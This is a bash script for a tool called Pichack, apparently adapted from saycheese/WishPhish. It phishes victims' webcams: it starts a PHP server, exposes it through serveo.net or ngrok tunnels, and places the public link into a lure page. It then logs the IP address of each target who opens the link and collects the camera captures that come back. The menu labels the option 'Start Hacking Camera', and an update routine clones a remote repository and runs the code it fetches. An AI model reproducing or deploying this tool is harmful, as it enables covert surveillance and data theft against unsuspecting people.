#!/bin/bash
# Inspired by: github.com/thelinuxchoice/saycheese
# Modified by: github.com/kinghacker0/WishPhish

trap 'printf "\n";stop' 2

banner() {

clear

echo -e "\033[31m __          _ _     _     \e[0m ______ _     _          ";
echo -e "\033[31m \ \        / (_)   | |    \e[0m|  ____(_)   | |         ";
echo -e "\033[31m  \ \  /\  / / _ ___| | __ \e[0m| |__   _ ___| |__       ";
echo -e "\033[31m   \ \/  \/ / | / __| '_  |\e[0m|  __| | / __| '_ \      ";
echo -e "\033[31m    \  /\  /  | \__ \ | | |\e[0m| |    | \__ \ | | |     ";
echo -e "\033[31m     \/  \/   |_|___/_| |_|\e[0m|_|    |_|___/_| |_| v2.0";

printf "\e[1;77m Website :- Yourhackinhouse \e[0m \n"
printf "\e[1;77m v2.0 Coded By The Jatin Kalwar \e[0m \n"

}
###patch
upda() {
 
if [ -d "$HOME/Pichack/off" ];
then
cd $HOME/Pichack/off
rm pic.txt
elif [ -d "$HOME/Pichack/off" ];
then
cd $HOME/Pichack/off
rm pic.txt
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATING NGROK, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/jatinkalwar/toolupdater 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           NGROK UPDATED SUCCESSFULLY (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd toolupdater/error
mv pic.txt $HOME/Pichack/off
cd $HOME
rm -rf toolupdater

}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}
##Update
  upd(){
if [ -d "$HOME/Pichack" ];
then
cd $HOME
rm -rf Pichack
elif [ -d "$HOME/Pichack" ];
then
cd $HOME
rm -rf Pichack
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/jatinkalwar/Pichack 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd Pichack
bash pichack.sh
}


## Menu
main_menu() {
	{ clear; banner; echo; }
     echo -e "\e[92m[\e[91m1\e[92m]\e[93m Start Hacking Camera\e[93m"
     echo -e "\e[92m[\e[91m2\e[92m]\e[93m Access Key\e[93m"
     echo -e "\e[92m[\e[91m3\e[92m]\e[93m About Me\e[93m"
     echo -e "\e[92m[\e[91m4\e[92m]\e[93m Practicle Video\e[93m"
     echo -e "\e[92m[\e[91m5\e[92m]\e[93m Visit Our Website\e[93m"
     echo -e "\e[92m[\e[91m6\e[92m]\e[93m Follow Us On Instagram\e[93m"
     echo -e "\e[92m[\e[91m7\e[92m]\e[93m Subscribe Our Channel\e[93m"
     echo -e "\e[92m[\e[91m8\e[92m]\e[93m Join Our Whatsapp Group\e[93m"
     echo -e "\e[92m[\e[91m9\e[92m]\e[93m Update Tool\e[93m"
     echo -e "\e[92m[\e[91m0\e[92m]\e[93m Exit\e[93m"

echo ''
echo -ne "SELECT OPTION ~> \e[0m"
read opt1
if [ $opt1 = "1" ];
then
clear
banner
echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50
echo -e "\e[93m"
read  -p "ACCESS KEY: " access
cd $HOME/Pichack/off
bas=$(cat pic.txt)
if [[ $access = $bas ]];
then
clear
  banner
  start1
        
else
clear
echo " "
echo -e "               \e[34m ============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"
echo -e "               \e[34m |                          |"
echo -e "               \e[34m |    Use shortlink for key |"
echo -e "               \e[34m |\e[92mhttps://gplinks.co/JfDYEEfD\e[34m |"
echo -e "               \e[34m |            [OR]          |"
echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m|"
echo -e "               \e[34m ============================\e[34m"
echo " "
sleep 5.0
fi
main_menu

elif [ $opt1 = "2" ];
then
am start -a android.intent.action.VIEW -d https://gplinks.co/JfDYEEfD > /dev/null
main_menu

elif [ $opt1 = "3" ];
then
clear
about
elif [ $opt1 = "4" ];
then
am start -a android.intent.action.VIEW -d https://bit.ly/3tPXkI3 > /dev/null
bash pichack.sh
elif [ $opt1 = "5" ];
then
am start -a android.intent.action.VIEW -d https://bit.ly/3tPXkI3 > /dev/null
bash pichack.sh
elif [ $opt1 = "6" ];
then
am start -a android.intent.action.VIEW -d https://www.instagram.com/yourhackinghouse/ > /dev/null 2>&1
bash pichack.sh
elif [ $opt1 = "7" ];
then
am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCMwPUQZrcSMzaW4yzhsXCXw > /dev/null 2>&1
bash pichack.sh
elif [ $opt1 = "8" ];
then
am start -a android.intent.action.VIEW -d https://forms.gle/qcLLqJZ2U94sFzrF6 > /dev/null
bash pichack.sh
elif [ $opt1 = "9" ];
then
clear
upd
elif [ $opt1 = "0" ];
then
		msg_exit
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; main_menu; }
	fi
}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}

payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' wishfish.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' wishfish.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="wishfish$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
upda
clear
dependencies
main_menu

